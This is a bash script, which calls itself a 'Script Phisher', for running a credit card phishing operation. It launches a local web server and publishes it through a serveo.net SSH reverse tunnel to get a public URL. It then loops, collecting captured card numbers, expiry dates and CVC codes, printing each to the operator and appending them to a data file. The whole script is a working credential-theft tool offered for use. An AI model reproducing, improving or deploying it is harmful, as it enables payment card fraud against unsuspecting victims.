#!/bin/bash
#   _   _       _                                    _ _          
#  | | | | __ _| |_ ___ _   _ _ __   ___   _ __ ___ (_) | ___   _ 
#  | |_| |/ _` | __/ __| | | | '_ \ / _ \ | '_ ` _ \| | |/ / | | |
#  |  _  | (_| | |_\__ \ |_| | | | |  __/ | | | | | | |   <| |_| |
#  |_| |_|\__,_|\__|___/\__,_|_| |_|\___| |_| |_| |_|_|_|\_\\__,_|                                                              
 
#    MIT License

# Copyright (c) [2024] [Hatsune_Miku] 

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

PORT="8080"
WHOAMI2=$(whoami)
WHOAMI="sasame"
GREEN="$(printf '\033[32m')" 
WHITE="$(printf '\033[37m')"
CYAN="$(printf '\033[36m')"
RED="$(printf '\033[31m')"
ORANGE="$(printf '\033[33m')" 
MAGENTA="$(printf '\033[35m')"

PS1="└─[${MAGENTA}-${WHITE}]"

START_ABOUT_HOST(){
    npm run dreq > /dev/null 2>&1 &
}

START(){
START_ABOUT_HOST
clear
cat banner
PAIN_START
echo -e "\n"
read -p "┌──[- ${WHOAMI} -] : command (${GREEN}start${WHITE})
${PS1}: " start
if [ $start == "start" ]; then
START_SCRIPT_SHELL
elif [ "$start" == "exit" ]; then
clear
sleep 0.5
exit
elif [ $start == "about" ]; then
start http://localhost:4040
START
else
echo -e "-${RED} ERRO : Try Again${WHITE}..."
sleep 0.75
clear
START
fi
}

START_SERVEO(){
    echo -e ""
echo -e "[-] Loading..."
    sleep 0.75;
#printf "\n${WHITE}[-] ${WHITEBG} ${BLACK}http://$HOST:$PORT ${RESETBG} ${WHITE} Initializing..."
sleep 2
echo ''
if [[ -e server/linksender ]]; then
rm -rf server/linksender
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$PORT' serveo.net 2> /dev/null > server/linksender ' &
sleep 7
send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" server/linksender)
echo -e "${WHITE}[-] URL: ${GREEN} $send_url${WHITE}"
SERVER_RU
}

PAIN_START(){
cat <<- EOF

  [::] sasame - whmer | Script Phisher
  [::] Github   ${CYAN}https://github.com/whmer/hatsune.cc.git${WHITE}
  [::] Whoami   ${CYAN}${WHOAMI2}${WHITE}

  [ ${RED}~> ${WHITE}Start${WHITE} 
  [ ${RED}~> ${WHITE}About${WHITE}    ${GREEN}http://localhost:4040${WHITE}
  [ ${RED}~> ${WHITE}Exit${WHITE}    
EOF
}


START_SCRIPT_SHELL(){
npm start > /dev/null 2>&1 & 
START_SERVEO
}
if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

OK(){
    DRE=$(grep -o '"Number":.*' dre3432432434342342q0000000xy.json | sed 's/"Number": "//')
    VALI=$(grep -o '"Validade":.*' dre3432432434342342q0000000xy.json | sed 's/"Validade": "//')
    CVC=$(grep -o '"CVC":.*' dre3432432434342342q0000000xy.json | sed 's/"CVC": "//')
    IFS=$'\n'
    ##json_pp < dre3432432434342342q0000000xy.json
    echo -e ""
    echo -e "${MAGENTA}[${WHITE}!${MAGENTA}] Nmber${WHITE}: ${DRE}"
    echo -e "${MAGENTA}[${WHITE}!${MAGENTA}] Validaty${WHITE}: ${VALI}"
    echo -e "${MAGENTA}[${WHITE}!${MAGENTA}] CVC${WHITE}: ${CVC}"
    cat dre3432432434342342q0000000xy.json >> auth/data.json
}

SERVER_RU(){
    sleep 0.75
echo "[-] ..."
    while true; do
    		if [[ -e "dre3432432434342342q0000000xy.json" ]]; then
			echo -e "\n${MAGENTA}[${WHITE}!${MAGENTA}] New data CC${WHITE} ~"
			OK
			rm -rf dre3432432434342342q0000000xy.json
		fi
        done
}
START
##START_SCRIPT_SHELL

